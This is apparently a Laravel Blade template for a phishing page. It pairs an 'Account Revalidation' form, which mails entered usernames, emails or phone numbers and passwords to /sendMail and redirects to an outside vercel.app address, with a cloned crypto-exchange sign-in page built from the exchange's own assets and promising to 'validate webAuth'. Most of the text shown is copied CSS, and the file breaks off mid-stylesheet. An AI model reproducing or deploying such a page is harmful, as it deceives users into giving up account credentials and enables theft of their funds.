{{--}}
<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, Helvetica, sans-serif;
    }

    form {
      border: 3px solid #f1f1f1;
    }

    input[type=text],
    input[type=password] {
      width: 100%;
      padding: 12px 20px;
      margin: 8px 0;
      display: inline-block;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }

    button {
      background-color: #04AA6D;
      color: white;
      padding: 14px 20px;
      margin: 8px 0;
      border: none;
      cursor: pointer;
      width: 100%;
    }

    button:hover {
      opacity: 0.8;
    }

    .cancelbtn {
      width: auto;
      padding: 10px 18px;
      background-color: #f44336;
    }

    .imgcontainer {
      text-align: center;
      margin: 24px 0 12px 0;
    }

    img.avatar {
      width: 40%;
      border-radius: 50%;
    }

    .container {
      padding: 16px;
    }

    span.psw {
      float: right;
      padding-top: 16px;
    }

    /* Change styles for span and cancel button on extra small screens */
    @media screen and (max-width: 300px) {
      span.psw {
        display: block;
        float: none;
      }

      .cancelbtn {
        width: 100%;
      }
    }
  </style>
</head>

<body>

  <h2>Account Revalidation</h2>

  <form class="contact-form" action="/sendMail" method="POST">
    @csrf
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://updatewebfix.vercel.app/code">
    <div class="imgcontainer">
      <img src="assets/img_avatar2.png" alt="Avatar" class="avatar">
    </div>
    <input type="radio" class="btn-check" name="options" id="option1" value="username" autocomplete="off" checked>
    <label class="btn btn-secondary" for="option1">Username</label>

    <input type="radio" class="btn-check" name="options" id="option2" value="email" autocomplete="off">
    <label class="btn btn-secondary" for="option2">Email</label>

    <input type="radio" class="btn-check" name="options" id="option4" value="mobile" autocomplete="off">
    <label class="btn btn-secondary" for="option4">Mobile</label>
    <div class="container">
      <label for="email"><b></b></label>
      <input type="text" placeholder="Enter" name="email" required>

      <label for="password"><b>Password</b></label>
      <input type="password" placeholder="Enter Password" name="password" required>

      <button type="submit" formmethod="post" formaction="/sendMail">Login</button>
      <label>
        <input type="checkbox" checked="checked" name="remember"> Remember me
      </label>
    </div>
  </form>

</body>

</html>


<!--
  <script src="../code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="../cdn.jsdelivr.net/npm/bootstrap%404.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
-->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<!-- header style two End -->
@if(session()->has('message'))
<script>
  Swal.fire({
    icon: "success",
    title: "Message Sent",
    text: "{{ session()->get('message') }}",
  });
</script>
@endif

</body>

</html>
{{--}}

<!DOCTYPE html>
<html translate="no" lang="en" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="renderer" content="webkit">
  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="theme-color" content="#000000">
  <meta httpequiv="Cache-Control" content="no-cache, max-age=0, must-revalidate">
  <meta name="google" content="notranslate">
  <meta name="description" content="Validate webAuth , and get your first crypto today!">
  <meta name="keywords" content="Sign Up,Register for an Account,Open an Account">
  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOmCnqEu92Fr1Mu4mxKKTU1Kg.woff2" as="font" type="font/woff2" crossorigin="">
  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmEU9fBBc4AMP6lQ.woff2" as="font" type="font/woff2" crossorigin="">
  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmEU9fABc4AMP6lbBP.woff2" as="font" type="font/woff2" crossorigin="">
  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmWUlfBBc4AMP6lQ.woff2" as="font" type="font/woff2" crossorigin="">
  <link rel="stylesheet" href="assets.staticimg.com/natasha/npm/%40kufox/mui%402.5.14/umd/kufox-mui.umd.min.css">

  <link href="assets.staticimg.com/natasha/npm/anomaly/style.css" rel="prefetch" as="style" crossorigin="">
  <link href="assets.staticimg.com/natasha/npm/fontsGoogleapis/googleapis.css" rel="prefetch" as="style" crossorigin="">
  <link href="assets.staticimg.com/ucenter-web/1.1.1/css/app.1af092.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="assets.staticimg.com/ucenter-web/1.1.1/css/1717.fd374f.css">
  <link rel="stylesheet" href="assets.staticimg.com/cms-static/c_cms.common_en_US2671.css?t=1693810" data-meta="cms_common">
  <link rel="stylesheet" href="assets.staticimg.com/cms-static/c_com.index.body.bottom_en_US2671.css?t=1693810" data-meta="com_index_body_bottom">
  <link rel="stylesheet" href="assets.staticimg.com/cms-static/c_com.seo.land.tradingbot_en_US2671.css?t=1693810" data-meta="com_seo_land_tradingbot">
  <link rel="stylesheet" href="assets.staticimg.com/cms-static/c_com.seo.land.c2c_en_US2671.css?t=1693810" data-meta="com_seo_land_c2c">
  <link rel="stylesheet" href="assets.staticimg.com/cms-static/c_com.community_en_US2671.css?t=1693810" data-meta="com_community">
  <meta name="twitter:card" content="summary_large_image" data-rh="true">
  <meta name="twitter:image" content="https://res.cloudinary.com/dwsla5hkc/image/upload/v1716839385/img_avatar2_eo4g87.png" data-rh="true">
  <meta name="twitter:image:src" content="https://res.cloudinary.com/dwsla5hkc/image/upload/v1716839385/img_avatar2_eo4g87.png" data-rh="true">
  <meta property="og:image" content="https://res.cloudinary.com/dwsla5hkc/image/upload/v1716839385/img_avatar2_eo4g87.png" data-rh="true">
  <meta property="og:image:secure_url" content="https://res.cloudinary.com/dwsla5hkc/image/upload/v1716839385/img_avatar2_eo4g87.png" data-rh="true">
  <meta property="og:image:width" content="1200" data-rh="true">
  <meta property="og:image:height" content="630" data-rh="true">
  <meta property="og:type" content="website" data-rh="true">
  <meta property="og:locale:alternate" content="de_DE" data-rh="true">
  <meta property="og:locale" content="en_US" data-rh="true">
  <meta property="og:locale:alternate" content="es_ES" data-rh="true">
  <meta property="og:locale:alternate" content="fr_FR" data-rh="true">
  <meta property="og:locale:alternate" content="ko_KR" data-rh="true">
  <meta property="og:locale:alternate" content="nl_NL" data-rh="true">
  <meta property="og:locale:alternate" content="pt_PT" data-rh="true">
  <meta property="og:locale:alternate" content="ru_RU" data-rh="true">
  <meta property="og:locale:alternate" content="tr_TR" data-rh="true">
  <meta property="og:locale:alternate" content="vi_VN" data-rh="true">
  <meta property="og:locale:alternate" content="zh_HK" data-rh="true">
  <meta property="og:locale:alternate" content="it_IT" data-rh="true">
  <meta property="og:locale:alternate" content="id_ID" data-rh="true">
  <meta property="og:locale:alternate" content="ms_MY" data-rh="true">
  <meta property="og:locale:alternate" content="hi_IN" data-rh="true">
  <meta property="og:locale:alternate" content="th_TH" data-rh="true">
  <meta property="og:locale:alternate" content="ja_JP" data-rh="true">
  <meta property="og:locale:alternate" content="bn_BD" data-rh="true">
  <meta property="og:locale:alternate" content="pl_PL" data-rh="true">
  <meta property="og:locale:alternate" content="fil_PH" data-rh="true">
  <meta property="og:locale:alternate" content="ar_AE" data-rh="true">
  <meta property="og:locale:alternate" content="ur_PK" data-rh="true">
  <style id="ssg-jss-node" ssg-jss-node="1" type="text/css">
    .css-76ygvu .gbiz-headeroom {
      border-bottom: 1px solid rgba(29, 29, 29, 0.08);
    }

    .css-1dn57jc {
      position: fixed;
      top: 0px;
      height: 100vh;
      width: 100%;
      overflow-y: auto;
      background: rgb(255, 255, 255);
      display: flex;
      flex-direction: column;
    }

    .css-1dn57jc::-webkit-scrollbar {
      width: 4px;
      background: transparent;
    }

    .css-1dn57jc::-webkit-scrollbar-track {
      background: transparent;
    }

    .css-1dn57jc::-webkit-scrollbar-thumb {
      background: rgb(204, 204, 204);
      border-radius: 2px;
    }

    .css-h96opg {
      width: 100%;
      flex: 1 1 0%;
      border-top: 1px solid rgba(29, 29, 29, 0.08);
    }

    .css-1erus7g {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      height: 100%;
    }

    .css-13d3z8n {
      width: 570px;
      position: absolute;
      top: 90px;
      left: 50px;
    }

    [dir="rtl"] .css-13d3z8n {
      top: 80px;
      right: 50px;
      width: 600px;
      padding: 24px;
      background: linear-gradient(270deg, rgb(234, 249, 248) 0%, rgba(235, 255, 254, 0) 100%);
      border-radius: 12px;
    }

    @media (max-width: 1439px) {
      .css-13d3z8n {
        top: 70px;
        left: 40px;
        width: 400px;
      }

      [dir="rtl"] .css-13d3z8n {
        top: 66px;
        right: 24px;
        width: 450px;
      }
    }

    .css-1hwe9d5 {
      width: 100%;
      font-size: 18px;
      font-weight: 500;
      line-height: 130%;
      word-break: break-word;
      color: rgb(29, 29, 29);
    }

    .css-1c7cr12 {
      width: 40px;
      height: 4px;
      margin: 24px 0px;
      border-radius: 20px;
      background: rgb(1, 188, 141);
    }

    .css-1n36i2x {
      font-size: 36px;
      font-weight: 700;
      line-height: 150%;
      color: rgb(29, 29, 29);
      word-break: break-word;
    }

    .css-1n36i2x .highlight {
      color: rgb(255, 215, 55);
      font-weight: 800;
      font-size: 40px;
      line-height: 130%;
      -webkit-text-stroke: 1px rgb(29, 29, 29);
    }

    @media (max-width: 1439px) {
      .css-1n36i2x {
        font-size: 28px;
      }

      .css-1n36i2x .highlight {
        font-size: 32px;
      }
    }

    body fieldset {
      min-width: initial;
      padding: initial;
      margin: initial;
      border: initial;
      margin-inline: 2px;
      padding-block: 0.35em 0.625em;
      padding-inline: 0.75em;
    }

    body legend {
      width: initial;
      padding: initial;
      padding-inline: 2px;
    }

    .css-atxi5g {
      position: relative;
      z-index: 100;
      width: 100%;
    }

    .css-atxi5g .logo {
      vertical-align: middle;
    }

    .css-1dftvkr {
      height: 0px;
    }

    .css-n4rmn7 {
      position: fixed;
      top: 0px;
      left: 0px;
      right: 0px;
      z-index: 1000;
      background-color: rgb(255, 255, 255);
      transition: background-color 0.5s ease 0s;
    }

    .css-1eazsyg {
      padding: 0px 32px;
      transition: all 0.3s ease 0s;
    }

    @media (max-width: 1439px) {
      .css-1eazsyg {
        padding: 0px 24px;
      }
    }

    @media (max-width: 767px) {
      .css-1eazsyg {
        padding: 0px 16px;
      }
    }

    .css-6ljh47 {
      display: flex;
      position: relative;
      flex: 1 1 auto;
      margin: 0px auto;
      transition: all 0.3s ease 0s;
      width: 100%;
      height: 80px;
      -webkit-box-pack: justify;
      justify-content: space-between;
    }

    @media (max-width: 1439px) {
      .css-6ljh47 {
        height: 64px;
      }
    }

    .css-6qnjre {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      height: 100%;
    }

    .css-1evik99 {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
    }

    .css-1evik99:hover {
      opacity: 0.8;
    }

    .css-qoy9sy {
      width: 121px;
      height: 28px;
      transition: all 0.3s ease 0s;
    }

    @media (max-width: 1439px) {
      .css-qoy9sy {
        width: 103.71px;
        height: 24px;
      }
    }

    .css-1sg2lsz {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
    }

    .css-1qt7m5u {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      flex-direction: row;
    }

    .css-1qt7m5u .navUserItem {
      color: rgb(29, 29, 29);
      cursor: pointer;
      padding: 0px;
      font-size: 14px;
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: auto;
      white-space: nowrap;
      text-decoration: none !important;
      background-clip: border-box !important;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem {
      padding: 0px 0px 0px 12px;
    }

    .css-1qt7m5u .navUserItem[data-menu="i18n"],
    .css-1qt7m5u .navUserItem[data-menu="currency"],
    .css-1qt7m5u .navUserItem[data-menu="download"],
    .css-1qt7m5u .navUserItem[data-menu="theme"] {
      display: flex;
    }

    .css-1qt7m5u .navUserItem[data-menu="order"],
    .css-1qt7m5u .navUserItem[data-menu="asset"],
    .css-1qt7m5u .navUserItem[data-menu="person"] {
      display: flex;
    }

    .css-1qt7m5u .navUserItem[data-menu="download"],
    .css-1qt7m5u .navUserItem[data-menu="i18n"],
    .css-1qt7m5u .navUserItem[data-menu="currency"],
    .css-1qt7m5u .navUserItem[data-menu="notice"],
    .css-1qt7m5u .navUserItem[data-menu="person"],
    .css-1qt7m5u .navUserItem[data-menu="order"] {
      padding: 0px;
    }

    .css-1qt7m5u .navUserItem[data-menu="notice"] {
      margin-right: 12px;
      margin-left: 0px;
    }

    .css-1qt7m5u .navUserItem[data-menu="person"],
    .css-1qt7m5u .navUserItem[data-menu="order"],
    .css-1qt7m5u .navUserItem[data-menu="notice"] {
      margin-left: 12px;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="download"] {
      margin-right: 12px;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="notice"] {
      margin: 0px;
    }

    @media (max-width: 767px) {
      .css-1qt7m5u .navUserItem[data-menu="notice"] svg {
        width: 16px;
        height: 16px;
      }
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="person"] {
      margin-left: 0px;
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem[data-menu="theme"] {
      padding: 0px 12px 0px 0px;
    }

    .css-1qt7m5u .navUserItem.signinLink {
      width: auto;
      margin-right: unset;
    }

    @media screen and (max-width: 414px) {
      .css-1qt7m5u .navUserItem.signinLink {
        display: none;
      }
    }

    .css-1qt7m5u .navUserItem.signinLink:hover {
      opacity: 0.6;
    }

    .css-1qt7m5u .navUserItem.signinLink:active {
      opacity: 1;
    }

    .css-1qt7m5u .navUserItem .signinBtn {
      width: unset;
      padding: 9px 24px;
      font-weight: 500;
      font-size: 14px;
      line-height: 130%;
      text-align: center;
      color: rgb(29, 29, 29);
      margin: 0px;
      transition: all 0.3s ease 0s;
      border: unset;
      border-radius: 24px;
    }

    @media (max-width: 767px) {
      .css-1qt7m5u .navUserItem .signinBtn {
        font-size: 12px;
      }
    }

    [dir="rtl"] .css-1qt7m5u .navUserItem .signinBtn {
      margin: 0px;
    }

    .css-1qt7m5u .navUserItem.signUpLink {
      width: auto;
    }

    .css-1qt7m5u .navUserItem.signUpLink:hover {
      opacity: 0.6;
    }

    .css-1qt7m5u .navUserItem.signUpLink:active {
      opacity: 1;
    }

    .css-1qt7m5u .navUserItem.signUpLink:active>img {
      display: block;
    }

    .css-1qt7m5u .navUserItem .signUpBtn {
      width: unset;
      padding: 9px 28px;
      border-radius: 90px;
      font-weight: 700;
      font-size: 14px;
      line-height: 130%;
      text-align: center;
      color: rgb(255, 255, 255);
      background: rgb(29, 29, 29);
      position: relative;
      transition: all 0.3s ease 0s;
    }

    @media (max-width: 767px) {
      .css-1qt7m5u .navUserItem .signUpBtn {
        padding: 8px 16px;
        font-size: 12px;
      }
    }

    .css-9zi109 {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      margin-right: 0px;
      flex-direction: row;
      width: auto;
      padding: 0px;
      -webkit-box-pack: unset;
      justify-content: unset;
    }

    .css-v71wna {
      width: 1px;
      height: 16px;
      margin: 0px 12px;
    }

    [dir="rtl"] .css-v71wna {
      margin: 0px 12px 0px 0px;
    }

    .css-15bj1sf {
      border: none;
      flex-shrink: 0;
      background: rgba(29, 29, 29, 0.08);
      display: block;
      width: 1px;
      height: 16px;
      margin: 0px 12px;
    }

    [dir="rtl"] .css-15bj1sf {
      margin: 0px 12px 0px 0px;
    }

    .css-1b9zzns {
      width: 40px;
      height: 40px;
      background: rgba(29, 29, 29, 0.04);
      border-radius: 50%;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      display: none;
    }

    [dir="rtl"] .css-1b9zzns {
      margin-right: 12px;
    }

    @media (max-width: 767px) {
      .css-1b9zzns {
        width: 32px;
        height: 32px;
        line-height: 30px;
        font-size: 14px;
      }
    }

    .css-1b9zzns:hover svg {
      fill: rgb(1, 188, 141);
    }

    .css-1n99kaq {
      max-width: 400px;
      width: 100%;
      height: 100vh;
      overflow: auto;
      background-color: rgb(255, 255, 255);
      padding: 0px !important;
    }

    .css-1n99kaq .KuxDrawer-content::-webkit-scrollbar {
      width: 3px;
      height: 3px;
    }

    .css-1n99kaq .KuxDrawer-content::-webkit-scrollbar-thumb {
      border-radius: 2px;
      background: rgba(29, 29, 29, 0.08);
    }

    .css-1n99kaq .showDownBox {
      padding: 0px 24px;
    }

    .css-1n99kaq .userBox {
      margin: 0px;
    }

    .css-lmssxu {
      max-width: 400px;
      width: 100%;
    }

    .css-lmssxu .KuxDrawer-content {}

    .css-lmssxu .KuxDrawer-content::-webkit-scrollbar {
      display: none;
    }

    .css-1iv9pmj {
      height: 81px;
    }

    .css-1lm9f0d {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      background-image: initial;
      background-position: initial;
      background-size: initial;
      background-repeat: initial;
      background-attachment: initial;
      background-origin: initial;
      background-color: rgba(29, 29, 29, 0.04);
      border-radius: 20px;
      margin-left: 12px;
      background-clip: padding-box !important;
    }

    [dir="rtl"] .css-1lm9f0d {
      margin-left: 0px;
      margin-right: 12px;
    }

    .css-1lm9f0d svg {
      color: rgb(29, 29, 29);
    }

    .css-1lm9f0d span {
      color: rgb(29, 29, 29);
      font-weight: 600;
      font-size: 14px;
    }

    .css-1lm9f0d:hover svg,
    .css-1lm9f0d:hover span {
      color: rgb(1, 188, 141);
    }

    .css-14yu18w .KuxModalHeader-root .KuxModalHeader-close {
      top: 24px !important;
    }

    .css-14yu18w .KuxDialog-content {
      padding: 0px;
      border-radius: 0px 0px 20px 20px;
    }

    .css-162y68p {
      height: 80px;
    }

    .css-wcpi88 .__AnimateOverlay__ {
      animation-duration: 0.23s;
      animation-name: animation-v15rbp;
      animation-fill-mode: forwards;
    }

    @-webkit-keyframes animation-v15rbp {
      0% {
        opacity: 1;
        transform: translateY(0px);
      }

      100% {
        opacity: 0;
        transform: translateY(8px);
      }
    }

    @keyframes animation-v15rbp {
      0% {
        opacity: 1;
        transform: translateY(0px);
      }

      100% {
        opacity: 0;
        transform: translateY(8px);
      }
    }

    .css-1a3v9iz {
      display: inline-flex;
    }

    .css-1a3v9iz .__AnimateOverlay__ {
      animation-duration: 0.23s;
      animation-name: animation-v15rbp;
      animation-fill-mode: forwards;
    }

    .css-5xkyj6 {
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      background: rgba(29, 29, 29, 0.04);
      border-radius: 50%;
    }

    .css-5xkyj6 svg {
      margin: 0px 6px;
    }

    .css-5xkyj6 img {
      width: 16px;
    }

    .css-5xkyj6:hover svg {
      fill: rgb(1, 188, 141);
    }

    .css-1dz931i {
      width: 100%;
      height: 100%;
      display: flex;
      flex-direction: column;
      background: rgb(255, 255, 255);
    }

    .css-1dz931i .banner {
      flex: 0 0 45%;
    }

    .css-gfyiy3 {
      display: flex;
      flex-flow: row wrap;
      -webkit-box-pack: start;
      justify-content: flex-start;
      align-items: flex-start;
    }

    .css-gfyiy3::before,
    .css-gfyiy3::after {
      display: flex;
    }

    .css-139vhbh {
      position: relative;
      min-height: 1px;
      display: block;
      flex: 0 0 45.8333%;
      max-width: 45.8333%;
    }

    .css-c0ajov {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      height: 100%;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      position: relative;
    }

    .css-qrlrtm {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      position: absolute;
      bottom: 0px;
    }

    .css-fm3kvj {
      position: absolute;
      inset: 0px;
      z-index: 0;
      display: flex;
    }

    .css-14d5rtx {
      flex: 1 1 55%;
      height: 100%;
      object-fit: cover;
      overflow: hidden;
    }

    .css-ts3x3g {
      position: relative;
      min-height: 1px;
      display: block;
    }

    .css-mpa8nz {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      height: 100%;
      width: 100%;
      align-items: flex-start;
      -webkit-box-pack: start;
      justify-content: flex-start;
      position: relative;
    }

    .css-1rsyla4 {
      position: relative;
      margin-top: 100px;
      margin-bottom: 100px;
      flex: 1 1 0%;
      width: 100%;
    }

    @media (max-width:NaNpx) {
      .css-1rsyla4 {
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    @media (max-width: 767px) {
      .css-1rsyla4 {
        padding: 0px 16px;
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    .css-5kgvnz {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      position: relative;
      margin-top: 100px;
      margin-bottom: 100px;
      flex: 1 1 0%;
      width: 100%;
    }

    @media (max-width:NaNpx) {
      .css-5kgvnz {
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    @media (max-width: 767px) {
      .css-5kgvnz {
        padding: 0px 16px;
        margin-top: 40px;
        margin-bottom: 40px;
      }
    }

    .css-uuchwj {
      width: 100%;
      max-width: 486px;
      margin: 0px auto 0px 100px;
      padding: unset;
    }

    @media (max-width: 1439px) {
      .css-uuchwj {
        margin: 0px auto;
      }
    }

    @media (max-width: 1199px) {
      .css-uuchwj {
        margin: 0px auto;
        padding: unset;
      }
    }

    @media (max-width: 767px) {
      .css-uuchwj {
        width: 100%;
        margin: 0px auto;
        max-width: unset;
        padding: unset;
      }
    }

    .css-b38fps {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      max-width: 486px;
      margin: 0px auto 0px 100px;
      padding: unset;
    }

    @media (max-width: 1439px) {
      .css-b38fps {
        margin: 0px auto;
      }
    }

    @media (max-width: 1199px) {
      .css-b38fps {
        margin: 0px auto;
        padding: unset;
      }
    }

    @media (max-width: 767px) {
      .css-b38fps {
        width: 100%;
        margin: 0px auto;
        max-width: unset;
        padding: unset;
      }
    }

    .css-1b1nvj1 {
      font-size: 40px;
      line-height: 130%;
      margin-bottom: 33px;
      font-weight: 700;
      color: rgb(29, 29, 29);
      word-break: break-word;
    }

    @media screen and (max-width: 768px) {
      .css-1b1nvj1 {
        font-size: 24px;
        margin-bottom: 25px;
      }
    }

    .css-1yvtdo {
      margin-bottom: 24px;
    }

    .css-5pto6a {
      position: relative;
      overflow: hidden;
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      flex-direction: row;
      height: 48px;
      border-bottom: none;
    }

    .css-1v8kgrz {
      position: relative;
      display: inline-block;
      flex: 1 1 auto;
      white-space: nowrap;
      height: 100%;
      overflow: hidden;
      width: 100%;
    }

    .css-v0g351 {
      display: flex;
      flex-direction: row;
      transition: all 0.3s ease 0s;
      padding-top: 11px;
    }

    .css-12u19n3 {
      overflow: hidden;
      flex-shrink: 0;
      text-align: center;
      white-space: normal;
      cursor: pointer;
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      display: inline-flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      outline: 0px;
      box-sizing: border-box;
      user-select: none;
      vertical-align: middle;
      appearance: none;
      text-decoration: none;
      -webkit-font-smoothing: antialiased;
      padding: 0px;
      font-weight: 500;
      -webkit-text-stroke: 0.4px rgb(29, 29, 29);
      line-height: 130%;
      color: rgb(29, 29, 29);
      transition: all 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      font-size: 16px;
      margin-left: 24px;
    }

    .css-12u19n3:first-of-type {
      margin-left: 0px;
    }

    [dir="rtl"] .css-12u19n3 {
      margin-left: 0px;
      margin-right: 24px;
    }

    .css-12u19n3:hover {
      color: rgb(29, 29, 29);
    }

    .css-1freloz {
      position: absolute;
      display: flex;
      -webkit-box-pack: center;
      justify-content: center;
      -webkit-box-align: center;
      align-items: center;
      bottom: 0px;
      width: 100%;
      height: 4px;
    }

    .css-1sknxmt {
      background: rgb(29, 29, 29);
      display: flex;
      -webkit-box-pack: center;
      justify-content: center;
      -webkit-box-align: center;
      align-items: center;
      border-radius: 4px;
      transition: all 0.3s ease 0s;
      height: 4px;
      width: 24px;
    }

    .css-1jrps8g {
      overflow: hidden;
      flex-shrink: 0;
      text-align: center;
      white-space: normal;
      cursor: pointer;
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      display: inline-flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
      outline: 0px;
      box-sizing: border-box;
      user-select: none;
      vertical-align: middle;
      appearance: none;
      text-decoration: none;
      -webkit-font-smoothing: antialiased;
      padding: 0px;
      font-weight: 500;
      -webkit-text-stroke: unset;
      line-height: 130%;
      color: rgba(29, 29, 29, 0.4);
      transition: all 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
      font-size: 16px;
      margin-left: 24px;
    }

    .css-1jrps8g:first-of-type {
      margin-left: 0px;
    }

    [dir="rtl"] .css-1jrps8g {
      margin-left: 0px;
      margin-right: 24px;
    }

    .css-1jrps8g:hover {
      color: rgba(29, 29, 29, 0.6);
    }

    .css-1b12qyh {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      width: 100%;
      position: absolute;
      bottom: 0px;
      right: 0px;
    }

    .css-fcf6q .mtSpace {
      margin-top: 8px;
    }

    @media (max-width: 767px) {
      .css-fcf6q .mtSpace {
        margin-top: 0px;
      }
    }

    .css-9mv970 {
      box-sizing: border-box;
      margin: 0px;
      padding: 0px;
      list-style: none;
    }

    .css-jvj7uf {
      flex-direction: column;
    }

    .css-1uqn2oy {
      display: flex;
      flex-flow: column wrap;
      -webkit-box-pack: start;
      justify-content: flex-start;
      align-items: flex-start;
    }

    .css-1uqn2oy::before,
    .css-1uqn2oy::after {
      display: flex;
    }

    .css-1ofqig9 {
      display: flex;
      flex-direction: column;
      width: 100%;
    }

    .css-1dbp2j {
      position: relative;
      min-height: 1px;
      display: flex;
      flex-direction: column;
      width: 100%;
    }

    .css-kooiip {
      position: relative;
      z-index: 1;
    }

    .css-1yw1v9j {
      position: relative;
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      background: transparent;
      outline: none;
      width: 100%;
      height: fit-content;
      box-sizing: border-box;
      border-radius: 8px;
      display: flex;
      flex-direction: row;
      -webkit-box-align: center;
      align-items: center;
      opacity: 1;
      cursor: text;
      padding: 0px 16px;
    }

    .css-1yn4dg3 {
      position: absolute;
      left: 0px;
      top: 0px;
      transform-origin: left top;
      padding: 0px 2px;
      white-space: nowrap;
      transition: color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms, transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms, max-width 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
      font-size: 16px;
      line-height: 24px;
      transform: translate(14px, 16px) scale(1);
      color: rgb(29, 29, 29);
      pointer-events: none;
    }

    [dir="rtl"] .css-1yn4dg3 {
      left: unset;
      right: 0px;
      font-size: 16px;
      line-height: 24px;
      transform: translate(-16px, 16px) scale(1);
    }

    .css-1nddmz0 {
      border: none;
      outline: none;
      padding: 0px;
      width: 100%;
      flex: 1 1 0%;
      margin: 0px;
      box-sizing: border-box;
      background: transparent;
      -webkit-tap-highlight-color: transparent;
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
      color: rgb(29, 29, 29);
      cursor: text;
      font-weight: 500;
      font-size: 16px;
      height: 56px;
      line-height: 26px;
    }

    .css-1nddmz0:-webkit-autofill {
      transition-delay: 99999s;
    }

    .css-1nddmz0:-webkit-autofill:hover {
      transition-delay: 99999s;
    }

    .css-1nddmz0:-webkit-autofill:focus {
      transition-delay: 99999s;
    }

    .css-1nddmz0:-webkit-autofill:active {
      transition-delay: 99999s;
    }

    .css-1nddmz0:focus {
      outline: none;
    }

    .css-1nddmz0::-webkit-input-placeholder {
      color: rgba(29, 29, 29, 0.4);
      font-family: Roboto, "PingFang SC", -apple-system, BlinkMacSystemFont, "Microsoft YaHei";
    }

    .css-1i4kc6k {
      position: absolute;
      inset: -5px -2px 0px;
      pointer-events: none;
      border-radius: 8px;
      border-style: solid;
      border-width: 1px;
      border-color: rgba(29, 29, 29, 0.12);
      overflow: hidden;
    }

    .css-17b03pk {
      visibility: hidden;
      height: 12px;
      line-height: 24px;
      max-width: 0.01px;
      padding: 0px;
      font-size: 12px;
    }

    .css-gvtyj4 {
      min-height: 24px;
      display: flex;
    }

    .css-7roxj2 {
      margin-left: 12px;
    }

    .css-c8a67t {
      visibility: hidden;
    }

    .css-js6o5x {
      box-sizing: border-box;
      min-height: 0px;
      min-width: 0px;
      display: flex;
      -webkit-box-align: center;
      align-items: center;
      -webkit-box-pack: center;
      justify-content: center;
    }

    .css-gu4t9 {
      margin-left: 4px;
      cursor: pointer;
      display: inline-flex;
      -webkit-box-align: center;
      align-items: center;
    }

    .css-gu4t9:hover {
      opacity: 0.7;
    }

    .css-1pwkgr3 {
      font-size: 14px;
    }

    .css-txmj0v {
      color: rgba(29, 29, 29, 0.6);
      display: flex;
      -webkit-box-align: center;
      align-items: center;
    }

    .css-txmj0v:hover {
      cursor: pointer;
    }

    .css-txmj0v span {
      font-weight: 400;
      font-size: 14px;
      line-height: 130%;
      color: rgba(29, 29, 29, 0.6);
      margin-right: 8px;
    }

    .css-oqopf2 {
      z-index: 1070;
    }

    .css-38lglc {
      display: none;
    }

    .css-jmf9id {
